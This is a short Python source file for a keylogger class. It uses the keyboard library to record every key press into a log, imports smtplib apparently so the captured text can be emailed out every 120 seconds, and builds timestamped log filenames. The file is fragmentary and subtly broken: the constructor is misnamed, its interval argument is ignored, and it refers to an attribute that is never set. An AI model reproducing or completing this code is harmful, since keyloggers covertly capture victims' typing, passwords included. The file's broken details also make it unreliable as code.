import keyboard
import smtplib

from threading import Timer
from datetime import datetime

REPORT_INTERVAL = 120


class Keylogger:

    def init(self, interval):
        self.interval = REPORT_INTERVAL
        self.log = ""
        self.startDate = datetime.now()
        self.endDate = datetime.now()

    def keyLog(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def updateFilename(self):
        startDateString = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
        endDateString = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog--{startDateString} to {endDateString}"


